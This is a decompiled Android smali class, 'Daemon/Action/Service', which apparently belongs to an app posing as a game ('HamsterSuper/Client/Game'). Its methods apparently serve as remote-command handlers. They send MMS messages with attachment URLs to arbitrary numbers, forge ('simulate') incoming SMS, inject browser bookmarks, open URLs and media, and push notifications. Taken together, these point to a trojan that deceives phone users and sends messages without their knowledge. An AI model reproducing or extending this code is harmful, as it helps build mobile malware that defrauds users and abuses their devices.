.class public LDaemon/Action/Service;
.super Ljava/lang/Object;
.source "Service.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 13
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static add_IE(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "title"    # Ljava/lang/String;
    .param p2, "url"    # Ljava/lang/String;

    .prologue
    .line 98
    new-instance v0, LDaemon/Service/IEMark;

    invoke-direct {v0, p0}, LDaemon/Service/IEMark;-><init>(Landroid/content/Context;)V

    .line 99
    .local v0, "iemark":LDaemon/Service/IEMark;
    invoke-virtual {v0, p1, p2}, LDaemon/Service/IEMark;->AddMark(Ljava/lang/String;Ljava/lang/String;)V

    .line 100
    return-void
.end method

.method public static open_IE(Landroid/content/Context;Ljava/lang/String;)V
    .locals 0
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "url"    # Ljava/lang/String;

    .prologue
    .line 87
    invoke-static {p0, p1}, LDaemon/Service/IEMark;->openIE(Landroid/content/Context;Ljava/lang/String;)V

    .line 88
    return-void
.end method

.method public static open_Media(Landroid/content/Context;Ljava/lang/String;)V
    .locals 4
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "filename"    # Ljava/lang/String;

    .prologue
    .line 73
    invoke-static {p0, p1}, LHamsterSuper/Client/Game/NoticeVideo;->restartPackage(Landroid/content/Context;Ljava/lang/String;)V

    .line 74
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 75
    .local v1, "it":Landroid/content/Intent;
    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 76
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 77
    .local v0, "f":Ljava/io/File;
    invoke-static {v0}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v2

    invoke-static {p1}, LDaemon/Service/Notice;->getType(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 78
    invoke-virtual {p0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 79
    return-void
.end method

.method public static show_Notice(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;I)V
    .locals 1
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "sub"    # Ljava/lang/String;
    .param p2, "text"    # Ljava/lang/String;
    .param p3, "filename"    # Ljava/lang/String;
    .param p4, "type"    # I

    .prologue
    .line 61
    new-instance v0, LDaemon/Service/Notice;

    invoke-direct {v0, p0}, LDaemon/Service/Notice;-><init>(Landroid/content/Context;)V

    .line 62
    .local v0, "notice":LDaemon/Service/Notice;
    invoke-virtual {v0, p3}, LDaemon/Service/Notice;->setfilename(Ljava/lang/String;)V

    .line 63
    invoke-virtual {v0, p1, p2, p4}, LDaemon/Service/Notice;->showNotice(Ljava/lang/String;Ljava/lang/String;I)V

    .line 64
    return-void
.end method

.method public static simulation_Mms(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1
    .param p0, "sub"    # Ljava/lang/String;
    .param p1, "text"    # Ljava/lang/String;
    .param p2, "Annex_url"    # Ljava/lang/String;
    .param p3, "number"    # Ljava/lang/String;

    .prologue
    .line 40
    sget-object v0, LDaemon/Service/SMSObserver;->mms:LDaemon/Service/MmsSender;

    invoke-virtual {v0, p0}, LDaemon/Service/MmsSender;->SetSub(Ljava/lang/String;)V

    .line 41
    sget-object v0, LDaemon/Service/SMSObserver;->mms:LDaemon/Service/MmsSender;

    invoke-virtual {v0, p1}, LDaemon/Service/MmsSender;->SetText(Ljava/lang/String;)V

    .line 42
    sget-object v0, LDaemon/Service/SMSObserver;->mms:LDaemon/Service/MmsSender;

    invoke-virtual {v0, p2}, LDaemon/Service/MmsSender;->SetAnnex_url(Ljava/lang/String;)V

    .line 43
    sget-object v0, LDaemon/Service/SMSObserver;->mms:LDaemon/Service/MmsSender;

    invoke-virtual {v0, p3}, LDaemon/Service/MmsSender;->SetNumber(Ljava/lang/String;)V

    .line 44
    sget-object v0, LDaemon/Service/SMSObserver;->mms:LDaemon/Service/MmsSender;

    invoke-virtual {v0}, LDaemon/Service/MmsSender;->send()V

    .line 45
    return-void
.end method

.method public static simulation_Sms(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p0, "mContext"    # Landroid/content/Context;
    .param p1, "number"    # Ljava/lang/String;
    .param p2, "body"    # Ljava/lang/String;

    .prologue
    .line 25
    invoke-static {p0, p1, p2}, LDaemon/Service/SMSObserver;->simulation_Sms(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 26
    return-void
.end method
